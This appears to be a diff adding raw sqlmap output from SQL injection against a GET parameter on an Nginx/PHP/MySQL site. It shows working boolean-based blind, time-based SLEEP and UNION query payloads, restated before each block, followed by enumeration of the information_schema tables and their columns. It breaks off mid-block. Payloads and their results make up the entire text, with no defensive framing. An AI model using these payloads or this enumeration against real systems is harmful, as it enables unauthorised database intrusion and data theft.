@@ -1,0 +1,1030 @@
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: test (GET)
+    Type: boolean-based blind
+    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: test=query' RLIKE (SELECT (CASE WHEN (3354=3354) THEN 0x7175657279 ELSE 0x28 END))-- tXaL
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: test=query' AND (SELECT * FROM (SELECT(SLEEP(5)))VZYk)-- DWlX
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 3 columns
+    Payload: test=query' UNION ALL SELECT NULL,CONCAT(0x716b6b7071,0x786a66677958535a4f7247476679707246786f5775415157664a74597669776c6d7359416d767672,0x7171787071),NULL#
+---
+web application technology: Nginx, PHP 5.3.10
+back-end DBMS: MySQL >= 5.0.12
+Database: information_schema
+[28 tables]
++---------------------------------------+
+| CHARACTER_SETS                        |
+| COLLATIONS                            |
+| COLLATION_CHARACTER_SET_APPLICABILITY |
+| COLUMNS                               |
+| COLUMN_PRIVILEGES                     |
+| ENGINES                               |
+| EVENTS                                |
+| FILES                                 |
+| GLOBAL_STATUS                         |
+| GLOBAL_VARIABLES                      |
+| KEY_COLUMN_USAGE                      |
+| PARTITIONS                            |
+| PLUGINS                               |
+| PROCESSLIST                           |
+| PROFILING                             |
+| REFERENTIAL_CONSTRAINTS               |
+| ROUTINES                              |
+| SCHEMATA                              |
+| SCHEMA_PRIVILEGES                     |
+| SESSION_STATUS                        |
+| SESSION_VARIABLES                     |
+| STATISTICS                            |
+| TABLES                                |
+| TABLE_CONSTRAINTS                     |
+| TABLE_PRIVILEGES                      |
+| TRIGGERS                              |
+| USER_PRIVILEGES                       |
+| VIEWS                                 |
++---------------------------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: test (GET)
+    Type: boolean-based blind
+    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: test=query' RLIKE (SELECT (CASE WHEN (3354=3354) THEN 0x7175657279 ELSE 0x28 END))-- tXaL
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: test=query' AND (SELECT * FROM (SELECT(SLEEP(5)))VZYk)-- DWlX
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 3 columns
+    Payload: test=query' UNION ALL SELECT NULL,CONCAT(0x716b6b7071,0x786a66677958535a4f7247476679707246786f5775415157664a74597669776c6d7359416d767672,0x7171787071),NULL#
+---
+web application technology: Nginx, PHP 5.3.10
+back-end DBMS: MySQL >= 5.0.12
+Database: information_schema
+Table: CHARACTER_SETS
+[4 columns]
++----------------------+-------------+
+| Column               | Type        |
++----------------------+-------------+
+| CHARACTER_SET_NAME   | varchar(32) |
+| DEFAULT_COLLATE_NAME | varchar(32) |
+| DESCRIPTION          | varchar(60) |
+| MAXLEN               | bigint(3)   |
++----------------------+-------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: test (GET)
+    Type: boolean-based blind
+    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: test=query' RLIKE (SELECT (CASE WHEN (3354=3354) THEN 0x7175657279 ELSE 0x28 END))-- tXaL
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: test=query' AND (SELECT * FROM (SELECT(SLEEP(5)))VZYk)-- DWlX
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 3 columns
+    Payload: test=query' UNION ALL SELECT NULL,CONCAT(0x716b6b7071,0x786a66677958535a4f7247476679707246786f5775415157664a74597669776c6d7359416d767672,0x7171787071),NULL#
+---
+web application technology: Nginx, PHP 5.3.10
+back-end DBMS: MySQL >= 5.0.12
+Database: information_schema
+Table: COLLATIONS
+[6 columns]
++--------------------+-------------+
+| Column             | Type        |
++--------------------+-------------+
+| CHARACTER_SET_NAME | varchar(32) |
+| COLLATION_NAME     | varchar(32) |
+| ID                 | bigint(11)  |
+| IS_COMPILED        | varchar(3)  |
+| IS_DEFAULT         | varchar(3)  |
+| SORTLEN            | bigint(3)   |
++--------------------+-------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: test (GET)
+    Type: boolean-based blind
+    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: test=query' RLIKE (SELECT (CASE WHEN (3354=3354) THEN 0x7175657279 ELSE 0x28 END))-- tXaL
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: test=query' AND (SELECT * FROM (SELECT(SLEEP(5)))VZYk)-- DWlX
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 3 columns
+    Payload: test=query' UNION ALL SELECT NULL,CONCAT(0x716b6b7071,0x786a66677958535a4f7247476679707246786f5775415157664a74597669776c6d7359416d767672,0x7171787071),NULL#
+---
+web application technology: Nginx, PHP 5.3.10
+back-end DBMS: MySQL >= 5.0.12
+Database: information_schema
+Table: COLLATION_CHARACTER_SET_APPLICABILITY
+[2 columns]
++--------------------+-------------+
+| Column             | Type        |
++--------------------+-------------+
+| CHARACTER_SET_NAME | varchar(32) |
+| COLLATION_NAME     | varchar(32) |
++--------------------+-------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: test (GET)
+    Type: boolean-based blind
+    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: test=query' RLIKE (SELECT (CASE WHEN (3354=3354) THEN 0x7175657279 ELSE 0x28 END))-- tXaL
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: test=query' AND (SELECT * FROM (SELECT(SLEEP(5)))VZYk)-- DWlX
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 3 columns
+    Payload: test=query' UNION ALL SELECT NULL,CONCAT(0x716b6b7071,0x786a66677958535a4f7247476679707246786f5775415157664a74597669776c6d7359416d767672,0x7171787071),NULL#
+---
+web application technology: Nginx, PHP 5.3.10
+back-end DBMS: MySQL >= 5.0.12
+Database: information_schema
+Table: COLUMNS
+[19 columns]
++--------------------------+---------------------+
+| Column                   | Type                |
++--------------------------+---------------------+
+| PRIVILEGES               | varchar(80)         |
+| CHARACTER_MAXIMUM_LENGTH | bigint(21) unsigned |
+| CHARACTER_OCTET_LENGTH   | bigint(21) unsigned |
+| CHARACTER_SET_NAME       | varchar(32)         |
+| COLLATION_NAME           | varchar(32)         |
+| COLUMN_COMMENT           | varchar(255)        |
+| COLUMN_DEFAULT           | longtext            |
+| COLUMN_KEY               | varchar(3)          |
+| COLUMN_NAME              | varchar(64)         |
+| COLUMN_TYPE              | longtext            |
+| DATA_TYPE                | varchar(64)         |
+| EXTRA                    | varchar(27)         |
+| IS_NULLABLE              | varchar(3)          |
+| NUMERIC_PRECISION        | bigint(21) unsigned |
+| NUMERIC_SCALE            | bigint(21) unsigned |
+| ORDINAL_POSITION         | bigint(21) unsigned |
+| TABLE_CATALOG            | varchar(512)        |
+| TABLE_NAME               | varchar(64)         |
+| TABLE_SCHEMA             | varchar(64)         |
++--------------------------+---------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: test (GET)
+    Type: boolean-based blind
+    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: test=query' RLIKE (SELECT (CASE WHEN (3354=3354) THEN 0x7175657279 ELSE 0x28 END))-- tXaL
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: test=query' AND (SELECT * FROM (SELECT(SLEEP(5)))VZYk)-- DWlX
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 3 columns
+    Payload: test=query' UNION ALL SELECT NULL,CONCAT(0x716b6b7071,0x786a66677958535a4f7247476679707246786f5775415157664a74597669776c6d7359416d767672,0x7171787071),NULL#
+---
+web application technology: Nginx, PHP 5.3.10
+back-end DBMS: MySQL >= 5.0.12
+Database: information_schema
+Table: COLUMN_PRIVILEGES
+[7 columns]
++----------------+--------------+
+| Column         | Type         |
++----------------+--------------+
+| COLUMN_NAME    | varchar(64)  |
+| GRANTEE        | varchar(81)  |
+| IS_GRANTABLE   | varchar(3)   |
+| PRIVILEGE_TYPE | varchar(64)  |
+| TABLE_CATALOG  | varchar(512) |
+| TABLE_NAME     | varchar(64)  |
+| TABLE_SCHEMA   | varchar(64)  |
++----------------+--------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: test (GET)
+    Type: boolean-based blind
+    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: test=query' RLIKE (SELECT (CASE WHEN (3354=3354) THEN 0x7175657279 ELSE 0x28 END))-- tXaL
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: test=query' AND (SELECT * FROM (SELECT(SLEEP(5)))VZYk)-- DWlX
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 3 columns
+    Payload: test=query' UNION ALL SELECT NULL,CONCAT(0x716b6b7071,0x786a66677958535a4f7247476679707246786f5775415157664a74597669776c6d7359416d767672,0x7171787071),NULL#
+---
+web application technology: Nginx, PHP 5.3.10
+back-end DBMS: MySQL >= 5.0.12
+Database: information_schema
+Table: ENGINES
+[6 columns]
++--------------+-------------+
+| Column       | Type        |
++--------------+-------------+
+| COMMENT      | varchar(80) |
+| ENGINE       | varchar(64) |
+| SAVEPOINTS   | varchar(3)  |
+| SUPPORT      | varchar(8)  |
+| TRANSACTIONS | varchar(3)  |
+| XA           | varchar(3)  |
++--------------+-------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: test (GET)
+    Type: boolean-based blind
+    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: test=query' RLIKE (SELECT (CASE WHEN (3354=3354) THEN 0x7175657279 ELSE 0x28 END))-- tXaL
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: test=query' AND (SELECT * FROM (SELECT(SLEEP(5)))VZYk)-- DWlX
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 3 columns
+    Payload: test=query' UNION ALL SELECT NULL,CONCAT(0x716b6b7071,0x786a66677958535a4f7247476679707246786f5775415157664a74597669776c6d7359416d767672,0x7171787071),NULL#
+---
+web application technology: Nginx, PHP 5.3.10
+back-end DBMS: MySQL >= 5.0.12
+Database: information_schema
+Table: EVENTS
+[24 columns]
++----------------------+---------------+
+| Column               | Type          |
++----------------------+---------------+
+| CHARACTER_SET_CLIENT | varchar(32)   |
+| COLLATION_CONNECTION | varchar(32)   |
+| CREATED              | datetime      |
+| DATABASE_COLLATION   | varchar(32)   |
+| DEFINER              | varchar(77)   |
+| ENDS                 | datetime      |
+| EVENT_BODY           | varchar(8)    |
+| EVENT_CATALOG        | varchar(64)   |
+| EVENT_COMMENT        | varchar(64)   |
+| EVENT_DEFINITION     | longtext      |
+| EVENT_NAME           | varchar(64)   |
+| EVENT_SCHEMA         | varchar(64)   |
+| EVENT_TYPE           | varchar(9)    |
+| EXECUTE_AT           | datetime      |
+| INTERVAL_FIELD       | varchar(18)   |
+| INTERVAL_VALUE       | varchar(256)  |
+| LAST_ALTERED         | datetime      |
+| LAST_EXECUTED        | datetime      |
+| ON_COMPLETION        | varchar(12)   |
+| ORIGINATOR           | bigint(10)    |
+| SQL_MODE             | varchar(8192) |
+| STARTS               | datetime      |
+| STATUS               | varchar(18)   |
+| TIME_ZONE            | varchar(64)   |
++----------------------+---------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: test (GET)
+    Type: boolean-based blind
+    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: test=query' RLIKE (SELECT (CASE WHEN (3354=3354) THEN 0x7175657279 ELSE 0x28 END))-- tXaL
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: test=query' AND (SELECT * FROM (SELECT(SLEEP(5)))VZYk)-- DWlX
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 3 columns
+    Payload: test=query' UNION ALL SELECT NULL,CONCAT(0x716b6b7071,0x786a66677958535a4f7247476679707246786f5775415157664a74597669776c6d7359416d767672,0x7171787071),NULL#
+---
+web application technology: Nginx, PHP 5.3.10
+back-end DBMS: MySQL >= 5.0.12
+Database: information_schema
+Table: FILES
+[38 columns]
++----------------------+---------------------+
+| Column               | Type                |
++----------------------+---------------------+
+| VERSION              | bigint(21) unsigned |
+| AUTOEXTEND_SIZE      | bigint(21) unsigned |
+| AVG_ROW_LENGTH       | bigint(21) unsigned |
+| CHECK_TIME           | datetime            |
+| CHECKSUM             | bigint(21) unsigned |
+| CREATE_TIME          | datetime            |
+| CREATION_TIME        | datetime            |
+| DATA_FREE            | bigint(21) unsigned |
+| DATA_LENGTH          | bigint(21) unsigned |
+| DELETED_ROWS         | bigint(4)           |
+| ENGINE               | varchar(64)         |
+| EXTENT_SIZE          | bigint(4)           |
+| EXTRA                | varchar(255)        |
+| FILE_ID              | bigint(4)           |
+| FILE_NAME            | varchar(64)         |
+| FILE_TYPE            | varchar(20)         |
+| FREE_EXTENTS         | bigint(4)           |
+| FULLTEXT_KEYS        | varchar(64)         |
+| INDEX_LENGTH         | bigint(21) unsigned |
+| INITIAL_SIZE         | bigint(21) unsigned |
+| LAST_ACCESS_TIME     | datetime            |
+| LAST_UPDATE_TIME     | datetime            |
+| LOGFILE_GROUP_NAME   | varchar(64)         |
+| LOGFILE_GROUP_NUMBER | bigint(4)           |
+| MAX_DATA_LENGTH      | bigint(21) unsigned |
+| MAXIMUM_SIZE         | bigint(21) unsigned |
+| RECOVER_TIME         | bigint(4)           |
+| ROW_FORMAT           | varchar(10)         |
+| STATUS               | varchar(20)         |
+| TABLE_CATALOG        | varchar(64)         |
+| TABLE_NAME           | varchar(64)         |
+| TABLE_ROWS           | bigint(21) unsigned |
+| TABLE_SCHEMA         | varchar(64)         |
+| TABLESPACE_NAME      | varchar(64)         |
+| TOTAL_EXTENTS        | bigint(4)           |
+| TRANSACTION_COUNTER  | bigint(4)           |
+| UPDATE_COUNT         | bigint(4)           |
+| UPDATE_TIME          | datetime            |
++----------------------+---------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: test (GET)
+    Type: boolean-based blind
+    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: test=query' RLIKE (SELECT (CASE WHEN (3354=3354) THEN 0x7175657279 ELSE 0x28 END))-- tXaL
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: test=query' AND (SELECT * FROM (SELECT(SLEEP(5)))VZYk)-- DWlX
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 3 columns
+    Payload: test=query' UNION ALL SELECT NULL,CONCAT(0x716b6b7071,0x786a66677958535a4f7247476679707246786f5775415157664a74597669776c6d7359416d767672,0x7171787071),NULL#
+---
+web application technology: Nginx, PHP 5.3.10
+back-end DBMS: MySQL >= 5.0.12
+Database: information_schema
+Table: GLOBAL_STATUS
+[2 columns]
++----------------+---------------+
+| Column         | Type          |
++----------------+---------------+
+| VARIABLE_NAME  | varchar(64)   |
+| VARIABLE_VALUE | varchar(1024) |
++----------------+---------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: test (GET)
+    Type: boolean-based blind
+    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: test=query' RLIKE (SELECT (CASE WHEN (3354=3354) THEN 0x7175657279 ELSE 0x28 END))-- tXaL
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: test=query' AND (SELECT * FROM (SELECT(SLEEP(5)))VZYk)-- DWlX
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 3 columns
+    Payload: test=query' UNION ALL SELECT NULL,CONCAT(0x716b6b7071,0x786a66677958535a4f7247476679707246786f5775415157664a74597669776c6d7359416d767672,0x7171787071),NULL#
+---
+web application technology: Nginx, PHP 5.3.10
+back-end DBMS: MySQL >= 5.0.12
+Database: information_schema
+Table: GLOBAL_VARIABLES
+[2 columns]
++----------------+---------------+
+| Column         | Type          |
++----------------+---------------+
+| VARIABLE_NAME  | varchar(64)   |
+| VARIABLE_VALUE | varchar(1024) |
++----------------+---------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: test (GET)
+    Type: boolean-based blind
+    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: test=query' RLIKE (SELECT (CASE WHEN (3354=3354) THEN 0x7175657279 ELSE 0x28 END))-- tXaL
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: test=query' AND (SELECT * FROM (SELECT(SLEEP(5)))VZYk)-- DWlX
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 3 columns
+    Payload: test=query' UNION ALL SELECT NULL,CONCAT(0x716b6b7071,0x786a66677958535a4f7247476679707246786f5775415157664a74597669776c6d7359416d767672,0x7171787071),NULL#
+---
+web application technology: Nginx, PHP 5.3.10
+back-end DBMS: MySQL >= 5.0.12
+Database: information_schema
+Table: KEY_COLUMN_USAGE
+[12 columns]
++-------------------------------+--------------+
+| Column                        | Type         |
++-------------------------------+--------------+
+| COLUMN_NAME                   | varchar(64)  |
+| CONSTRAINT_CATALOG            | varchar(512) |
+| CONSTRAINT_NAME               | varchar(64)  |
+| CONSTRAINT_SCHEMA             | varchar(64)  |
+| ORDINAL_POSITION              | bigint(10)   |
+| POSITION_IN_UNIQUE_CONSTRAINT | bigint(10)   |
+| REFERENCED_COLUMN_NAME        | varchar(64)  |
+| REFERENCED_TABLE_NAME         | varchar(64)  |
+| REFERENCED_TABLE_SCHEMA       | varchar(64)  |
+| TABLE_CATALOG                 | varchar(512) |
+| TABLE_NAME                    | varchar(64)  |
+| TABLE_SCHEMA                  | varchar(64)  |
++-------------------------------+--------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: test (GET)
+    Type: boolean-based blind
+    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: test=query' RLIKE (SELECT (CASE WHEN (3354=3354) THEN 0x7175657279 ELSE 0x28 END))-- tXaL
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: test=query' AND (SELECT * FROM (SELECT(SLEEP(5)))VZYk)-- DWlX
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 3 columns
+    Payload: test=query' UNION ALL SELECT NULL,CONCAT(0x716b6b7071,0x786a66677958535a4f7247476679707246786f5775415157664a74597669776c6d7359416d767672,0x7171787071),NULL#
+---
+web application technology: Nginx, PHP 5.3.10
+back-end DBMS: MySQL >= 5.0.12
+Database: information_schema
+Table: PARTITIONS
+[25 columns]
++-------------------------------+---------------------+
+| Column                        | Type                |
++-------------------------------+---------------------+
+| AVG_ROW_LENGTH                | bigint(21) unsigned |
+| CHECK_TIME                    | datetime            |
+| CHECKSUM                      | bigint(21) unsigned |
+| CREATE_TIME                   | datetime            |
+| DATA_FREE                     | bigint(21) unsigned |
+| DATA_LENGTH                   | bigint(21) unsigned |
+| INDEX_LENGTH                  | bigint(21) unsigned |
+| MAX_DATA_LENGTH               | bigint(21) unsigned |
+| NODEGROUP                     | varchar(12)         |
+| PARTITION_COMMENT             | varchar(80)         |
+| PARTITION_DESCRIPTION         | longtext            |
+| PARTITION_EXPRESSION          | longtext            |
+| PARTITION_METHOD              | varchar(12)         |
+| PARTITION_NAME                | varchar(64)         |
+| PARTITION_ORDINAL_POSITION    | bigint(21) unsigned |
+| SUBPARTITION_EXPRESSION       | longtext            |
+| SUBPARTITION_METHOD           | varchar(12)         |
+| SUBPARTITION_NAME             | varchar(64)         |
+| SUBPARTITION_ORDINAL_POSITION | bigint(21) unsigned |
+| TABLE_CATALOG                 | varchar(512)        |
+| TABLE_NAME                    | varchar(64)         |
+| TABLE_ROWS                    | bigint(21) unsigned |
+| TABLE_SCHEMA                  | varchar(64)         |
+| TABLESPACE_NAME               | varchar(64)         |
+| UPDATE_TIME                   | datetime            |
++-------------------------------+---------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: test (GET)
+    Type: boolean-based blind
+    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: test=query' RLIKE (SELECT (CASE WHEN (3354=3354) THEN 0x7175657279 ELSE 0x28 END))-- tXaL
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: test=query' AND (SELECT * FROM (SELECT(SLEEP(5)))VZYk)-- DWlX
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 3 columns
+    Payload: test=query' UNION ALL SELECT NULL,CONCAT(0x716b6b7071,0x786a66677958535a4f7247476679707246786f5775415157664a74597669776c6d7359416d767672,0x7171787071),NULL#
+---
+web application technology: Nginx, PHP 5.3.10
+back-end DBMS: MySQL >= 5.0.12
+Database: information_schema
+Table: PLUGINS
+[10 columns]
++------------------------+-------------+
+| Column                 | Type        |
++------------------------+-------------+
+| PLUGIN_AUTHOR          | varchar(64) |
+| PLUGIN_DESCRIPTION     | longtext    |
+| PLUGIN_LIBRARY         | varchar(64) |
+| PLUGIN_LIBRARY_VERSION | varchar(20) |
+| PLUGIN_LICENSE         | varchar(80) |
+| PLUGIN_NAME            | varchar(64) |
+| PLUGIN_STATUS          | varchar(10) |
+| PLUGIN_TYPE            | varchar(80) |
+| PLUGIN_TYPE_VERSION    | varchar(20) |
+| PLUGIN_VERSION         | varchar(20) |
++------------------------+-------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: test (GET)
+    Type: boolean-based blind
+    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: test=query' RLIKE (SELECT (CASE WHEN (3354=3354) THEN 0x7175657279 ELSE 0x28 END))-- tXaL
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: test=query' AND (SELECT * FROM (SELECT(SLEEP(5)))VZYk)-- DWlX
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 3 columns
+    Payload: test=query' UNION ALL SELECT NULL,CONCAT(0x716b6b7071,0x786a66677958535a4f7247476679707246786f5775415157664a74597669776c6d7359416d767672,0x7171787071),NULL#
+---
+web application technology: Nginx, PHP 5.3.10
+back-end DBMS: MySQL >= 5.0.12
+Database: information_schema
+Table: PROCESSLIST
+[8 columns]
++---------+-------------+
+| Column  | Type        |
++---------+-------------+
+| TIME    | int(7)      |
+| USER    | varchar(16) |
+| COMMAND | varchar(16) |
+| DB      | varchar(64) |
+| HOST    | varchar(64) |
+| ID      | bigint(4)   |
+| INFO    | longtext    |
+| STATE   | varchar(64) |
++---------+-------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: test (GET)
+    Type: boolean-based blind
+    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: test=query' RLIKE (SELECT (CASE WHEN (3354=3354) THEN 0x7175657279 ELSE 0x28 END))-- tXaL
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: test=query' AND (SELECT * FROM (SELECT(SLEEP(5)))VZYk)-- DWlX
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 3 columns
+    Payload: test=query' UNION ALL SELECT NULL,CONCAT(0x716b6b7071,0x786a66677958535a4f7247476679707246786f5775415157664a74597669776c6d7359416d767672,0x7171787071),NULL#
+---
+web application technology: Nginx, PHP 5.3.10
+back-end DBMS: MySQL >= 5.0.12
+Database: information_schema
+Table: PROFILING
+[18 columns]
++---------------------+--------------+
+| Column              | Type         |
++---------------------+--------------+
+| BLOCK_OPS_IN        | int(20)      |
+| BLOCK_OPS_OUT       | int(20)      |
+| CONTEXT_INVOLUNTARY | int(20)      |
+| CONTEXT_VOLUNTARY   | int(20)      |
+| CPU_SYSTEM          | decimal(9,6) |
+| CPU_USER            | decimal(9,6) |
+| DURATION            | decimal(9,6) |
+| MESSAGES_RECEIVED   | int(20)      |
+| MESSAGES_SENT       | int(20)      |
+| PAGE_FAULTS_MAJOR   | int(20)      |
+| PAGE_FAULTS_MINOR   | int(20)      |
+| QUERY_ID            | int(20)      |
+| SEQ                 | int(20)      |
+| SOURCE_FILE         | varchar(20)  |
+| SOURCE_FUNCTION     | varchar(30)  |
+| SOURCE_LINE         | int(20)      |
+| STATE               | varchar(30)  |
+| SWAPS               | int(20)      |
++---------------------+--------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: test (GET)
+    Type: boolean-based blind
+    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: test=query' RLIKE (SELECT (CASE WHEN (3354=3354) THEN 0x7175657279 ELSE 0x28 END))-- tXaL
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: test=query' AND (SELECT * FROM (SELECT(SLEEP(5)))VZYk)-- DWlX
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 3 columns
+    Payload: test=query' UNION ALL SELECT NULL,CONCAT(0x716b6b7071,0x786a66677958535a4f7247476679707246786f5775415157664a74597669776c6d7359416d767672,0x7171787071),NULL#
+---
+web application technology: Nginx, PHP 5.3.10
+back-end DBMS: MySQL >= 5.0.12
+Database: information_schema
+Table: REFERENTIAL_CONSTRAINTS
+[11 columns]
++---------------------------+--------------+
+| Column                    | Type         |
++---------------------------+--------------+
+| CONSTRAINT_CATALOG        | varchar(512) |
+| CONSTRAINT_NAME           | varchar(64)  |
+| CONSTRAINT_SCHEMA         | varchar(64)  |
+| DELETE_RULE               | varchar(64)  |
+| MATCH_OPTION              | varchar(64)  |
+| REFERENCED_TABLE_NAME     | varchar(64)  |
+| TABLE_NAME                | varchar(64)  |
+| UNIQUE_CONSTRAINT_CATALOG | varchar(512) |
+| UNIQUE_CONSTRAINT_NAME    | varchar(64)  |
+| UNIQUE_CONSTRAINT_SCHEMA  | varchar(64)  |
+| UPDATE_RULE               | varchar(64)  |
++---------------------------+--------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: test (GET)
+    Type: boolean-based blind
+    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: test=query' RLIKE (SELECT (CASE WHEN (3354=3354) THEN 0x7175657279 ELSE 0x28 END))-- tXaL
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: test=query' AND (SELECT * FROM (SELECT(SLEEP(5)))VZYk)-- DWlX
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 3 columns
+    Payload: test=query' UNION ALL SELECT NULL,CONCAT(0x716b6b7071,0x786a66677958535a4f7247476679707246786f5775415157664a74597669776c6d7359416d767672,0x7171787071),NULL#
+---
+web application technology: Nginx, PHP 5.3.10
+back-end DBMS: MySQL >= 5.0.12
+Database: information_schema
+Table: ROUTINES
+[23 columns]
++----------------------+---------------+
+| Column               | Type          |
++----------------------+---------------+
+| CHARACTER_SET_CLIENT | varchar(32)   |
+| COLLATION_CONNECTION | varchar(32)   |
+| CREATED              | datetime      |
+| DATABASE_COLLATION   | varchar(32)   |
+| DEFINER              | varchar(77)   |
+| DTD_IDENTIFIER       | varchar(64)   |
+| EXTERNAL_LANGUAGE    | varchar(64)   |
+| EXTERNAL_NAME        | varchar(64)   |
+| IS_DETERMINISTIC     | varchar(3)    |
+| LAST_ALTERED         | datetime      |
+| PARAMETER_STYLE      | varchar(8)    |
+| ROUTINE_BODY         | varchar(8)    |
+| ROUTINE_CATALOG      | varchar(512)  |
+| ROUTINE_COMMENT      | varchar(64)   |
+| ROUTINE_DEFINITION   | longtext      |
+| ROUTINE_NAME         | varchar(64)   |
+| ROUTINE_SCHEMA       | varchar(64)   |
+| ROUTINE_TYPE         | varchar(9)    |
+| SECURITY_TYPE        | varchar(7)    |
+| SPECIFIC_NAME        | varchar(64)   |
+| SQL_DATA_ACCESS      | varchar(64)   |
+| SQL_MODE             | varchar(8192) |
+| SQL_PATH             | varchar(64)   |
++----------------------+---------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: test (GET)
+    Type: boolean-based blind
+    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: test=query' RLIKE (SELECT (CASE WHEN (3354=3354) THEN 0x7175657279 ELSE 0x28 END))-- tXaL
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: test=query' AND (SELECT * FROM (SELECT(SLEEP(5)))VZYk)-- DWlX
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 3 columns
